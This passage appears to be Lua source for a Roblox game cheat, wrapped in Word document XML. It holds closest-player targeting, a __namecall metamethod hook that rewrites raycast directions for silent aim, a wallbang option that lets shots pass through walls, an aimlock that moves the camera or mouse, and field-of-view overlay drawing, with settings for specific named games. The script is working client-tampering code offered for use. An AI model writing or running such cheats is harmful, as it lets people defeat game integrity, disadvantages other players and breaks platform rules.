        <w:t xml:space="preserve">                table.insert(_Players, {Plr = Value, Range = (Player.Character.HumanoidRootPart.Position - Value.Character.HumanoidRootPart.Position).Magnitude})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            table.sort(_Players, function(...)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                return select(1, ...).Range &lt; select(2, ...).Range</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            return _Players[1] and _Players[1].Plr or nil</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end);</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        GetClosestPlayerToMouseSilent = LPH_NO_VIRTUALIZE(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if not Config.Silent.Enabled then return end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if not Config.Silent.Targetting then return end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local PriorityPlayers = {}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local Plrs = GetPlayers(Players)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if library.priority[1] then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                for Index, Value in Plrs do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if Value == LocalPlayer then continue end;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if not table.find(library.priority, Value.Name) then continue end;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if table.find(library.whitelist, Value.Name) then continue end;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if (Value.Character and FindFirstChild(Value.Character, "HumanoidRootPart") and FindFirstChild(Value.Character,"Humanoid") and FindFirstChild(Value.Character,"Humanoid").Health &gt; (Game_Name == "South Bronx" and 4 or 0)) then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if FindFirstChildOfClass(Value.Character, "ForceField") then continue end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if FindFirstChild(Value.Character, "Torso") and FindFirstChild(Value.Character, "Torso").Material == Enum.Material.ForceField then continue end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if Value.Character.Parent == nil then continue end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        local TargetPart = FindFirstChild(Value.Character, "HumanoidRootPart");</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        local MouseLocation = Vector2.new(Mouse.X, Mouse.Y)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        local TargetPartPosition, OnScreen = WorldToScreenPoint(Camera, TargetPart.Position);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        local Radius = Config.Silent.UseFieldOfView and Config.Silent.Radius or 9e9;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        local Magnitude = (Vector2.new(TargetPartPosition.X,TargetPartPosition.Y) - MouseLocation).Magnitude;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if not DistanceCheck(Value, Config.Silent.MaxDistance) then continue end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if Radius &gt; Magnitude and OnScreen and Value then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            if not Config.Silent.WallBang and (Config.Silent.WallCheck and (not WallCheck(Value.Character))) then continue end;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            table.insert(PriorityPlayers, {Player = Value, Distance = Magnitude});</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        end;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    </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                table.sort(PriorityPlayers, function(Player , PlayerTwo)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    return Player.Distance&lt;PlayerTwo.Distance</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end);</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if PriorityPlayers[1] then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    return PriorityPlayers[1].Player</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local ValidPlayers = {};</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            for Index, Value in Plrs do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if Value == LocalPlayer then continue end;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if table.find(library.whitelist, Value.Name) then continue end;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if (Value.Character and FindFirstChild(Value.Character, "HumanoidRootPart") and FindFirstChild(Value.Character,"Humanoid") and FindFirstChild(Value.Character,"Humanoid").Health &gt; (Game_Name == "South Bronx" and 4 or 0)) then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if FindFirstChildOfClass(Value.Character, "ForceField") then continue end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if FindFirstChild(Value.Character, "Torso") and FindFirstChild(Value.Character, "Torso").Material == Enum.Material.ForceField then continue end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if Value.Character.Parent == nil then continue end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    local TargetPart = FindFirstChild(Value.Character, "HumanoidRootPart")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    local MouseLocation = Vector2.new(Mouse.X, Mouse.Y)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    local TargetPartPosition, OnScreen = WorldToScreenPoint(Camera, TargetPart.Position)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    local Radius = Config.Silent.UseFieldOfView and Config.Silent.Radius or 9e9</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    local Magnitude = (Vector2.new(TargetPartPosition.X,TargetPartPosition.Y) - MouseLocation).Magnitude</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if not DistanceCheck(Value, Config.Silent.MaxDistance) then continue end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if Radius &gt; Magnitude and OnScreen and Value then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if not Config.Silent.WallBang and (Config.Silent.WallCheck and not WallCheck(Value.Character)) then continue end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        table.insert(ValidPlayers, {Player = Value, Distance = Magnitude})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            table.sort(ValidPlayers, function(Player , PlayerTwo)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                return Player.Distance&lt;PlayerTwo.Distance                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if ValidPlayers[1] then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                return ValidPlayers[1].Player                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            return nil            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end);</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        SilentTarget = GetClosestPlayerToMouseSilent()</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        TargetTable = {GetClosestPlayerToMouseAimbot();}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local __namecall; __namecall = Solara and nil or not Solara and hookmetamethod(Workspace, "__namecall", LPH_NO_VIRTUALIZE(function(...)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local Arguments = {...};</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local Method = getnamecallmethod();</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if checkcaller() then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                return __namecall(...)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if not SilentTarget then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                return __namecall(...)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if not Config.Silent.Enabled then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                return __namecall(...)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if Game_Name == "Town" then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if tostring(getcallingscript()) ~= "GunScript" then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    return __namecall(...)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if not (mathrandom(0, 100) &lt;= Config.Silent.HitChance) then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                return __namecall(...)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if Game_Name == "The Bronx" then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local Script = getcallingscript()</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if not (Script.Name == "GunScript_Local" or Script.Name == "BulletVisualizerServerScript" or Script.Name == "BulletVisualizerClientScript") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    return __namecall(...)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local RandomPart = Config.Silent.TargetPart[1] and Config.Silent.TargetPart[math.random(1, #Config.Silent.TargetPart)] or "Head"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if Method == "Raycast" and table.find(Config.Game.Ray_Systems, "Raycast") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local Script = getcallingscript()</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if Game_Name == "BlockSpin" then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if Script and not (Script.Name == "Gun") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        return __namecall(...)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Game_Name == "South Bronx" then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if Script and Script.Name == "RealismClient" then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        return __namecall(...)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Config.Silent.Enabled then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if Config.Silent.Targetting then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        local Target = SilentTarget</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if Target and Target.Character and FindFirstChild(Target.Character, RandomPart) and FindFirstChild(Target.Character,"Humanoid") and FindFirstChild(Target.Character,"Humanoid").Health ~= 0 then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            local TargetPart = FindFirstChild(Target.Character, RandomPart);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            local Origin = Arguments[2];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            local Direction = (TargetPart.Position - Origin).Unit * 1000;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Arguments[3] = Direction;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        end;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if Config.Silent.WallBang and Game_Name ~= "BlockSpin" then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            local FilterDescendantsInstances = {};</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            if Target.Character then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                for Index, Value in pairs(GetDescendants(Target.Character)) do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    if IsA(Value, "Part") or IsA(Value, "BasePart") or IsA(Value, "MeshPart") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                        table.insert(FilterDescendantsInstances, Value)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                end;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            end;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            local RaycastParams = RaycastParams.new();</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            RaycastParams.FilterType = Enum.RaycastFilterType.Include</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            RaycastParams.IgnoreWater = false</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            RaycastParams.RespectCanCollide = false</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            RaycastParams.FilterDescendantsInstances = FilterDescendantsInstances</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Arguments[4] = RaycastParams</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        end;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if not Config.Silent.WallBang and Game_Name == "South Bronx" then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            local RaycastParams = RaycastParams.new()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            RaycastParams.FilterType = Enum.RaycastFilterType.Blacklist</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            RaycastParams.FilterDescendantsInstances = {LocalPlayer.Character}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Arguments[4] = RaycastParams</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        end;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        return __namecall(unpack(Arguments))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end;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if string.find(string.lower(Method), "findpartonray") and (table.find(Config.Game.Ray_Systems, "FindPartOnRay") or table.find(Config.Game.Ray_Systems, "FindPartOnRayWithWhitelist")) then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if Config.Silent.Enabled then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if Config.Silent.Targetting and mathrandom(0, 100) &lt;= Config.Silent.HitChance then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        local Target = SilentTarget;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if Target and Target.Character and FindFirstChild(Target.Character, RandomPart) and FindFirstChild(Target.Character,"Humanoid") and FindFirstChild(Target.Character,"Humanoid").Health ~= 0 then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            local TargetPart = FindFirstChild(Target.Character, RandomPart);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            local Origin = Arguments[2].Origin;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            local Direction = (TargetPart.Position - Origin).Unit * 9e17;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Arguments[2] = Ray.new(Origin, Direction)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            if Config.Silent.WallBang then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                return TargetPart, TargetPart.Position, Vector3.new(0,0,0)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            return __namecall(unpack(Arguments))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        end;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end;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            return __namecall(...)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end));</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local function Draw(ClassName, Properties)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local Drawing = Drawing.new(ClassName);</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            for Property, Value in Properties do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Drawing[Property] = Value;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            return Drawing</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local AimbotFieldOfViewOutline = Draw("Circle", {Visible = false, Color = Color3.new(0, 0, 0), Radius = 100, NumSides = 100, Thickness = 4});</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local AimbotFieldOfView = Draw("Circle", {Visible = false, Color = Color3.new(1, 1, 1), Radius = 100, NumSides = 100, Thickness = 2});</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local AimbotFieldOfViewFill = Draw("Circle", {Visible = false, Color = Color3.new(1, 1, 1), Radius = 100, NumSides = 100, Thickness = 2, Filled = true});</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local AimbotSnaplineOutline = Draw("Line", {Visible = false, Color = Color3.new(0, 0, 0), Thickness = 3});</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local AimbotSnapline = Draw("Line", {Visible = false, Color = Color3.new(1, 1, 1), Thickness = 1});</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local SilentFieldOfViewOutline = Draw("Circle", {Visible = false, Color = Color3.new(0, 0, 0), Radius = 100, NumSides = 100, Thickness = 4});</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local SilentFieldOfView = Draw("Circle", {Visible = false, Color = Color3.new(1, 1, 1), Radius = 100, NumSides = 100, Thickness = 2});</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local SilentFieldOfViewFill = Draw("Circle", {Visible = false, Color = Color3.new(1, 1, 1), Radius = 100, NumSides = 100, Thickness = 2, Filled = true});</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local SilentSnaplineOutline = Draw("Line", {Visible = false, Color = Color3.new(0, 0, 0), Thickness = 3});</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local SilentSnapline = Draw("Line", {Visible = false, Color = Color3.new(1, 1, 1), Thickness = 1});</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        RunService:BindToRenderStep("Functions",math.huge,LPH_NO_VIRTUALIZE(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if Config.Silent.Mode == "Always" then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Config.Silent.Targetting = true;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local MouseLocation = UserInputService:GetMouseLocation()</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if (not LocalPlayer) or (not LocalPlayer.Character) or (not LocalPlayer.Character:FindFirstChild("Humanoid")) then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                return                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if not TargetTable[1] then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                TargetTable[1] = GetClosestPlayerToMouseAimbot();</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if (TargetTable[1] and TargetTable[1].Character and TargetTable[1].Character:FindFirstChild("Humanoid") and TargetTable[1].Character:FindFirstChild("Humanoid").Health == 0) then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                TargetTable[1] = nil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local Target = TargetTable[1]</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if (Config.Aimlock.Enabled and Config.Aimlock.Aiming and Config.Aimlock.Type == "Mouse") and (Target and Target.Character and Target.Character:FindFirstChild(Config.Aimlock.TargetPart)) then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local TargetPosition = Target.Character:FindFirstChild(Config.Aimlock.TargetPart).Position;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local Result, OnScreen = Camera:WorldToScreenPoint(TargetPosition);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if OnScreen then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Move_Mouse_Function(Vector2.new(Result.X - Mouse.X, Result.Y - Mouse.Y).X / (Config.Aimlock.Smoothness+1) , Vector2.new(Result.X - Mouse.X, Result.Y - Mouse.Y).Y / (Config.Aimlock.Smoothness + 1));</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            elseif (Config.Aimlock.Enabled and Config.Aimlock.Aiming and Config.Aimlock.Type == "Camera") and (Target and Target.Character and Target.Character:FindFirstChild(Config.Aimlock.TargetPart)) then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local Smoothness = Config.Aimlock.Smoothness * 10;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Camera.CFrame = Camera.CFrame:Lerp(CFrame.new(Camera.CFrame.p, Target.Character:FindFirstChild(Config.Aimlock.TargetPart).Position), (100 - Smoothness) / 100);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            SilentTarget = GetClosestPlayerToMouseSilent()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local AimlockTarget = TargetTable[1]</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            AimbotFieldOfView.Visible = Config.Aimlock.Enabled and Config.Aimlock.DrawFieldOfView and Config.Aimlock.UseFieldOfView</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            AimbotFieldOfView.Radius = Config.Aimlock.Radius</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            AimbotFieldOfView.Color = Config.Aimlock.FieldOfViewColor</w:t>
      </w:r>
    </w:p>
